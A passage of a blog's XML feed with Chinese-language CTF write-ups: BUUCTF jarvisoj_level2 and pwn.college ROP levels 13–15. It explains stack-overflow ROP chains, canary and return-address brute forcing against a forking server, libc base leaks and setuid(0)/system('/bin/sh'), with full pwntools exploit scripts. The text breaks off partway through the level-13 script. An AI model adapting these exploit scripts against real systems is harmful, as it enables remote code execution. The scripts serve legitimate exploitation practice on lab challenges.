class="hljs-string">&quot;43.205.113.100&quot;</span>,<span class="hljs-number">8027</span>)<br>payload=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&quot;ALIVE&quot;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your name:\n\n&quot;</span>)<br>ioTube.sendline(payload)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-jarvisoj_level2</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上一道ROP类型题目，原题链接在这：<a href="https://buuoj.cn/challenges#jarvisoj_level2">BUUCTF原题：jarvisoj_level2</a><br></p><span id="more"></span><p>思路容易想到，但是32位程序，由于不熟悉32位程序的特点卡了一段时间，因此做个记录<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先检查开启了哪些保护<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/checksec.png"><br>可以看到只开启了NX<br><br>然后把二进制文件拖入IDA分析<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-vuln.png"><br>可以看到溢出点发生在vulnerable_function，同时注意到程序使用了system函数，因此考虑能不能ret2text（只要找到&#x2F;bin&#x2F;sh字符串即可）<br><br>shift+F12看一下，太好了，在程序里找到了&#x2F;bin&#x2F;sh字符串，如下图<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-binsh.png"><br>至此，可以得知，这道题的漏洞点就是构造ROP链，利用溢出返回到system函数地址，拿到shell<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，在IDA里可以直接看到，由于返回地址在ebp往上4个字节（32位，64位就是8个字节），offset&#x3D;0x88+0x4&#x3D;0x8C<br><br>对于system函数和&#x2F;bin&#x2F;sh字符串，这里直接通过python的pwn库定位，比较方便，不用硬编码<br><br>另外，由于32位系统的特点，此处不需要寻找pop rdi的指令碎片，也不需要考虑16字节对齐<br><br>32位传参时，通过栈进行传递，一般为返回地址1、返回地址2、参数1、参数2，即和返回地址依次对应，因此在sysAddr上方填充一个0作为返回地址（填什么都可以，拿到shell就不会回来了），否则binsh字符串会被解析为下一个返回地址<br><br>因此可以写出如下的利用脚本<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./BUUCTF08&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;set follow-fork-mode parent&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25094</span>)<br>elf=ELF(targetELF)<br>offset=<span class="hljs-number">0x8C</span> <span class="hljs-comment">#还有116个字节的机会</span><br>sysAddr=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>binshArgc=<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#open(&quot;sysAddr.txt&quot;,&quot;w&quot;).write(str(hex(sysAddr)))</span><br><span class="hljs-comment">#open(&quot;binsh.txt&quot;,&quot;w&quot;).write(str(hex(binshArgc)))</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshArgc)<br>ioTube.send(payload)<br><span class="hljs-comment">#ioTube.recv()</span><br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2text</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-14-and-15</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>14.0和15.0两题放在一起，主要因为这两题方法类似，但又存在一些trick方面的坑<br><br>这两题目标程序的逻辑相同，均是监听端口、通过fork子进程处理请求，溢出点也在子进程<br></p><span id="more"></span><p>先以14.0为例，15.0和其非常类似，只是需要一个类似脑筋急转弯的trick，能想到就很容易，想不到就会一直卡住（比如我靠自己就死活没想到）</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先一样的checksec，看到保护全开<br><br>接下来使用IDA，反编译一下<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-14-main.png"><br>看到main函数会不停的fork子进程，由子进程调用challenge函数来处理链接<br><br>main函数里正好也没发现溢出点，进challenge看一下，果不其然溢出点就在challenge的read这里<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据分析，漏洞利用思路就是：<br><br>首先爆破canary的值，爆破的理论基础见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a><br><br>之后爆破函数返回地址拿到程序本身的基地址<br><br>接着用程序本身的gadget去泄露libc基地址，类似level4的方法<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>最后，拿到libc基地址，那就可以随便调用函数去拿shell了<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">72</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br>pop_rdi_offset=<span class="hljs-number">0x26c3</span> <span class="hljs-comment">#challenge里面的偏移，pop rdi碎片用challenge里面的</span><br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-comment">#爆破返回地址，challenge里应该是回到……?636，main里面</span><br>retAddrOffset=<span class="hljs-number">0x2636</span><br>returnAddr=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PayLoad&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(payload2)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br>elfBase=returnAddr-retAddrOffset<br>pop_rdiReal=elfBase+pop_rdi_offset<br>elf.address=elfBase<br>retPadAlign=elfBase+<span class="hljs-number">0x101a</span><br><br><span class="hljs-comment">#泄露libc基地址</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;setvbuf&quot;</span><br>leakFuncOffset=libc.symbols[leakFuncName]<br>leakFuncGOT=elf.got[leakFuncName]<br><br><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>) + knownCanary + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdiReal) + p64(leakFuncGOT) + p64(retPadAlign) + p64(pltAddr)<br>ioHandler.send(payload3)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br><br>realAddr=u64(ioHandler.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=realAddr-libc.symbols[leakFuncName]<br><br><span class="hljs-comment">#print(&quot;泄露函数名=&#123;&#125;；真实地址=&#123;&#125;；该函数偏移=&#123;&#125;；libc基址=&#123;&#125;\n&quot;.format(leakFuncName,hex(realAddr),hex(leakFuncOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><h1 id="level15-0的trick"><a href="#level15-0的trick" class="headerlink" title="level15.0的trick"></a>level15.0的trick</h1><p>其实，level15.0和14.0的源码结构基本上都一致，唯一的区别就是15.0是在main函数里直接处理请求，因此没有challenge函数了<br><br>也就是说溢出后返回地址是libc里面的地址，如下图<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-15-main.png"><br>这会带来一个问题，因为我们注意到在level14.0中，是如何判断返回地址爆破正确还是错误？是通过输出，因为如果返回到main函数，会相应输出”Goodbye”,如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是，15题是从main函数返回，转而调用exit，因此即便正确爆破返回地址，也没有任何输出供我们判断<br><br>这里卡了很久……，最后经提醒才想到：<br><br>为什么一定要爆破返回地址的值呢？<br><br>最终目的是拿到libc基址，又不是要爆破返回地址！<br><br>所以，既然原返回地址后面没输出，那就跳到main开始的地方去，那里有输出啊！<br><br>这样，思路就转化成爆__libc_start_main的地址即可，反正__libc_start_main也在libc库里面<br><br>综上，写出的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level15.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">104</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KillProc</span>(<span class="hljs-params">response</span>):<br>    pattern = <span class="hljs-string">r&quot;(\d+):\ttransferring control&quot;</span><br>    matches=re.findall(pattern,response)<br>    <span class="hljs-keyword">if</span>(matches):<br>        pid=(<span class="hljs-built_in">int</span>)(matches[<span class="hljs-number">0</span>])<br>        os.kill(pid, signal.SIGTERM)<br><br><br><span class="hljs-comment">#该如何衡量main函数的返回地址“猜对了”还是“猜错了”？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">main退出流程：</span><br><span class="hljs-string">1 main-&gt;return 0，执行ret指令之前rsp指向的地方存着mov rdi,rax指令的地址，然后pop rip</span><br><span class="hljs-string">2 跳去执行mov rdi,rax（此时rax=0），这个0将作为exit的参数</span><br><span class="hljs-string">3 call exit</span><br><span class="hljs-string">没有输出？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">response</span>): <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;This challenge is listening for connections on TCP port 1337.&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#爆破__libc_start_main地址</span><br>returnAddr=<span class="hljs-string">b&#x27;\x2D&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;\x2D&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        ioHandler.close()<br>        <span class="hljs-keyword">if</span> check(response):<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>iThinkRetOffset=<span class="hljs-number">0x2402d</span><br>libcBase=returnAddr-iThinkRetOffset<br>pop_rdiReal=libcBase+<span class="hljs-number">0x23b6a</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#print(&quot;泄露出的返回地址=&#123;&#125;,认为偏移=&#123;&#125;，libc基地址=&#123;&#125;\n&quot;.format(hex(returnAddr),hex(iThinkRetOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><p>哎，所以总结一下，还是那句话，时刻拷问自己：什么是目的，什么是手段，防止陷入思维定势分不清目标<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-13</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题目提示这道题存在canary保护，因此要想办法绕过canary（爆破或泄露）</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>老样子checksec看一下除了canary还开了什么，看到保护全开，只能ROP，但是还要想办法在运行时获取libc基地址<br><br>接下来靠IDA了，拖进去看一下发现可以在输入之前读取buffer起始地址和任意地址处的内容<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-13/IDA.png"><br>可以看到溢出点在main函数，在溢出点前面可以泄露buffer起始地址和一个任意地址处的内容<br><br>综上，漏洞点利用思路就清晰了：<br><br>应该分为两个阶段发送payload，这一点其实和第4题类似<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>只不过多了需要泄露canary的步骤，以及需要换一种方法泄露libc基地址（因为开启了PIE，gadget不再可用）</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先，第一次泄露canary，由于题目会直接泄露buffer起始地址，只要用这个地址+(offset-16)，在第二次泄露时泄露该地址的值就是canary<br><br>接下来是泄露libc基地址以及返回程序开始的地方以触发第二阶段<br><br>但是，程序开启了PIE，无法像level-4那样，通过调用gadget直接打印某个libc函数的真实地址，并且通过pwn的symbols方法获取_start函数的地址以返回开始的地方<br><br>不过，注意到溢出点在main函数。根据main函数的启动和退出机制，见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a><br><br>所以低位覆盖，让它回到_libc_start_main即可开启二阶段；同样可以在第二阶段通过leak泄露返回地址的值，减去最低位的一个半字节即可<br><br>综上，可以编写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 